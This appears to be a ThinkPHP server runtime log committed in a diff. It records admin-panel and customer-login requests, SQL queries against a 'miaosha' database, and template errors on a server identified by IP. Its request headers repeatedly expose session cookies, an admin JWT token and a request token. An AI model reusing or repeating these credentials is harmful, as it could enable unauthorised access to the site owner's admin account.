+[ 2021-01-12T14:03:53+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/stat/index.html
+[运行时间：0.052251s] [吞吐率：19.14req/s] [内存消耗：3,381.16kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'stat',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'username=admin; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQzMTQyOSwibmJmIjoxNjEwNDMxNDI5LCJleHAiOjE2MTA0MzI2Mjl9.NCZon5hGTVP2fFgdBSx9f519XdjSwRnOp1cxpPCg0MU; Path=/www/wwwroot/101.37.13.45; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/admin/main/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000453s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000851s ]
+[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000280s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.001021s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 1 LIMIT 1 [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000619s ]
+[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 1 [ RunTime:0.000215s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000611s ]
+[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Stat' , 'index' , 1 , 'admin' , '1931204339' , '1610431433') [ RunTime:0.005768s ]
+[ error ] [10501]SQLSTATE[42S22]: Column not found: 1054 Unknown column 'name' in 'where clause'[/www/wwwroot/101.37.13.45/thinkphp/library/think/db/Connection.php:385]
+---------------------------------------------------------------
+[ 2021-01-12T14:03:56+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/main/index.html
+[运行时间：0.037302s] [吞吐率：26.81req/s] [内存消耗：3,388.78kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'username=admin; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQzMTQyOSwibmJmIjoxNjEwNDMxNDI5LCJleHAiOjE2MTA0MzI2Mjl9.NCZon5hGTVP2fFgdBSx9f519XdjSwRnOp1cxpPCg0MU; Path=/www/wwwroot/101.37.13.45; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/admin/main/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Main->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/main/index.html [ array (
+  0 => 'username',
+  1 => 'menu',
+  2 => 'lists',
+  3 => 'user',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000375s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000720s ]
+[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000235s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000494s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 1 LIMIT 1 [ RunTime:0.000162s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000528s ]
+[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000571s ]
+[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Main' , 'index' , 1 , 'admin' , '1931204339' , '1610431436') [ RunTime:0.005032s ]
+[ sql ] [ SQL ] SELECT * FROM `user` [ RunTime:0.000181s ]
+---------------------------------------------------------------
+[ 2021-01-12T14:03:57+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/log/index.html
+[运行时间：0.066911s] [吞吐率：14.95req/s] [内存消耗：3,489.22kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'log',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'username=admin; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQzMTQyOSwibmJmIjoxNjEwNDMxNDI5LCJleHAiOjE2MTA0MzI2Mjl9.NCZon5hGTVP2fFgdBSx9f519XdjSwRnOp1cxpPCg0MU; Path=/www/wwwroot/101.37.13.45; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/admin/main/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Log->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Log.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/log/index.html [ array (
+  0 => 'username',
+  1 => 'menu',
+  2 => 'lists',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000388s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000717s ]
+[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000225s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000522s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 1 LIMIT 1 [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000497s ]
+[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000534s ]
+[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Log' , 'index' , 1 , 'admin' , '1931204339' , '1610431437') [ RunTime:0.004414s ]
+[ sql ] [ SQL ] SELECT * FROM `admin_log` [ RunTime:0.000356s ]
+---------------------------------------------------------------
+[ 2021-01-12T14:03:58+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/staff/index.html
+[运行时间：0.032896s] [吞吐率：30.40req/s] [内存消耗：1,839.50kb] [文件加载：36]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'staff',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'username=admin; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQzMTQyOSwibmJmIjoxNjEwNDMxNDI5LCJleHAiOjE2MTA0MzI2Mjl9.NCZon5hGTVP2fFgdBSx9f519XdjSwRnOp1cxpPCg0MU; Path=/www/wwwroot/101.37.13.45; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/admin/log/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T14:23:58+08:00 ] 176.235.159.243 GET 101.37.13.45:80/
+[运行时间：0.014841s] [吞吐率：67.38req/s] [内存消耗：1,758.87kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T14:27:57+08:00 ] 51.103.51.243 GET 101.37.13.45/
+[运行时间：0.015006s] [吞吐率：66.64req/s] [内存消耗：1,758.88kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.24.0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:14:23+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/clogin/index.html
+[运行时间：0.038981s] [吞吐率：25.65req/s] [内存消耗：2,255.77kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'clogin',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Clogin->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Clogin.php ]
+[ info ] [ LOG ] INIT File
+[ error ] [0]模板文件不存在:/www/wwwroot/101.37.13.45/public/../application/admin/view/clogin/index.html[/www/wwwroot/101.37.13.45/thinkphp/library/think/view/driver/Think.php:82]
+---------------------------------------------------------------
+[ 2021-01-12T15:14:43+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/clogin/login.html
+[运行时间：0.021796s] [吞吐率：45.88req/s] [内存消耗：2,213.18kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'clogin',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:15:05+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/clogin/index.html
+[运行时间：0.025565s] [吞吐率：39.12req/s] [内存消耗：2,375.61kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'clogin',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Clogin->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Clogin.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/clogin/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:47:16+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.021164s] [吞吐率：47.25req/s] [内存消耗：1,922.62kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:47:42+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.019341s] [吞吐率：51.70req/s] [内存消耗：1,922.62kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:47:44+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.018433s] [吞吐率：54.25req/s] [内存消耗：1,922.62kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:48:00+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.020877s] [吞吐率：47.90req/s] [内存消耗：2,256.27kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+[ error ] [0]模板文件不存在:/www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html[/www/wwwroot/101.37.13.45/thinkphp/library/think/view/driver/Think.php:82]
+---------------------------------------------------------------
+[ 2021-01-12T15:48:16+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.035974s] [吞吐率：27.80req/s] [内存消耗：2,375.98kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:52:20+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.030272s] [吞吐率：33.03req/s] [内存消耗：2,187.15kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
